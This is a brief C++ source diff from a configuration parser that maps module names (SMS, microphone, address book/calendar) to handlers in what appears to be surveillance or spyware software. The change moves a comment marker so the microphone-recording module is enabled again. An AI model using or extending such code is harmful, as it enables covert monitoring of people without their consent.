@@ -104,12 +104,12 @@ BOOL WINAPI Conf::ParseModule(JSONArray js) {
 				startProc = SmsAgent;
 				break;
 			}
-
+			***/
 			if (moduleName.compare(L"mic") == 0 ) {
 				startProc = RecordedMicrophone;
 				break;
 			}
-			***/
+			
 			// AddressBook e calendar sono la stessa cosa
 			if (moduleName.compare(L"addressbook") == 0) {
 				startProc = CalendarModule;
